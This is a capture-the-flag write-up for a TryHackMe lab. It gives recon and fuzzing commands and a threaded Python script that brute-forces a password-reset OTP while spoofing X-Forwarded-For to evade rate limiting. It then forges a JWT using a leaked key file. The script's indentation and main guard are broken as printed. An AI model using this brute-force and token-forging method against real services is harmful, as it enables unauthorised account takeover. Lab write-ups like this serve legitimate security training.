**Goal**: Bypass authentication and get RCE
## Recon

### Network Discovery

Start with network mapping using Nmap or RustScan.

bash

```bash
rustscan -a 10.128.170.138
```

The result:

bash

```bash
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
1337/tcp open  waste   syn-ack ttl 64
```

Now I will run Nmap on port 1337 to identify the service running on it.

bash

```bash
nmap -sV -p 1337 10.128.170.138
```

Output:

bash

```bash
PORT     STATE SERVICE VERSION
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Now we can access the website using this port.

It’s a login page with a reset password function. While reviewing the page source, I found this hint:

```
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

This means that when we start content discovery, we need to add the `hmr_` prefix.

### Content Discovery

I started content discovery using ffuf.

bash

```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.128.170.138:1337/hmr_FUZZ -e / -mc 200
```

Output:

bash

```bash
css/
images/
js/
logs/
```

After that, we need to visit the logs directory, but remember the dev hint above, so we go to `hmr_logs/`.

<img width="419" height="203" alt="image" src="https://github.com/user-attachments/assets/b5cee983-04e8-4e6f-8d22-385a769ed2a9" />


In `error.logs`, I found an email address that tried to log in: `tester@hammer.thm`.

### Exploiting the Reset Password Function

When I entered `tester@hammer.thm` in the email input, it redirected me to an OTP page that asks for a 4-digit OTP within 160 seconds.

<img width="703" height="465" alt="image" src="https://github.com/user-attachments/assets/5cac4a8b-47f1-48d4-b5ab-69b7bf81b523" />


After some research, I realised that **X-Forwarded-For** would work: when I add it to the request, the rate limit returned in the response is reset.

So I used this Python script to automate the process.

python

```python
# script with assistance of ChatGPT  
# script for TryHckMe room Hammer: https://tryhackme.com/r/room/hammer  
# you need to update the script with target machine IP and your Cookie  
# check video: https://youtu.be/T_F44rHKgZY  
  
import requests  
import random  
from concurrent.futures import ThreadPoolExecutor, as_completed  
  
# Configuration variables  
ip_address = "10.10.46.106"  
port = "1337"  
phpsessid = "qv40uaabb5cpig354rg1adjvof"  
  
# Base URL of the form submission page  
url = f"http://{ip_address}:{port}/reset_password.php"  
  
# Common headers for the request (without X-Forwarded-For)  
common_headers = {  
"Host": f"{ip_address}:{port}",  
"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",  
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",  
"Accept-Language": "en-US,en;q=0.5",  
"Accept-Encoding": "gzip, deflate, br",  
"Content-Type": "application/x-www-form-urlencoded",  
"Origin": f"http://{ip_address}:{port}",  
"DNT": "1",  
"Connection": "keep-alive",  
"Referer": f"http://{ip_address}:{port}/reset_password.php",  
"Upgrade-Insecure-Requests": "1",  
"Priority": "u=0, i",  
"Cookie": f"PHPSESSID={phpsessid}"  
}  
  
# Custom exception to exit all threads once the correct code is found  
class CodeFoundException(Exception):  
pass  
  
# Function to generate all possible 4-digit codes  
def generate_codes():  
for i in range(10000):  
yield f"{i:04}" # Format the number as a 4-digit string, e.g., "0001"  
  
# Function to send a POST request  
def send_request(code):  
# Generate a random X-Forwarded-For IP address  
x_forwarded_for = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"  
  
# Add the X-Forwarded-For header to the request headers  
headers = common_headers.copy()  
headers["X-Forwarded-For"] = x_forwarded_for  
  
# Data to be sent with the POST request  
data = {  
"recovery_code": code,  
"s": "106" # Replace this with the correct hidden field value if necessary  
}  
  
try:  
# Send the POST request with the new X-Forwarded-For IP address  
response = requests.post(url, headers=headers, data=data, timeout=2)  
  
# Check if the recovery code is correct  
if "Invalid or expired recovery code!" not in response.text:  
print(f"Success! The correct code is: {code}")  
raise CodeFoundException  
except requests.RequestException:  
pass  
  
return False  
  
# Function to run the requests in parallel using threading  
def run_bruteforce():  
try:  
# Use a ThreadPoolExecutor to run multiple requests in parallel  
with ThreadPoolExecutor(max_workers=100) as executor: # Adjust max_workers as needed  
futures = {executor.submit(send_request, code): code for code in generate_codes()}  
  
for future in as_completed(futures):  
future.result() # Trigger the exception if the correct code is found  
except CodeFoundException:  
print("Correct code found, stopping execution.")  
executor.shutdown(wait=False)  
  
if _name_ == "_main_":  
run_bruteforce()
```

### Analysing the JWT

After logging in, I got the flag.

<img width="720" height="387" alt="image" src="https://github.com/user-attachments/assets/092d8a9b-003a-48ed-854a-91009c08744f" />


After some playing around, I figured out that only the `ls` command is allowed; anything else is blocked.

<img width="584" height="821" alt="image" src="https://github.com/user-attachments/assets/b072cc6e-f523-45b0-a438-ed33a80a127a" />


All of this was captured in Burp history, so when I opened Burp I found a JWT. I tried all the common JWT attacks, such as the `none` algorithm and altering the payload before resending, but nothing worked. So I went back to the page and started thinking about the `188ade1.key` file. I opened it in a new tab and downloaded it. It contains this value:

`56058354efb3daa97ebab00fabd7a7d7`

Then I opened jwt.io, changed the payload to _admin_ and the `kid` to `/var/www/html/188ade1.key`, and signed the token with the value from `188ade1.key`.

And it worked.
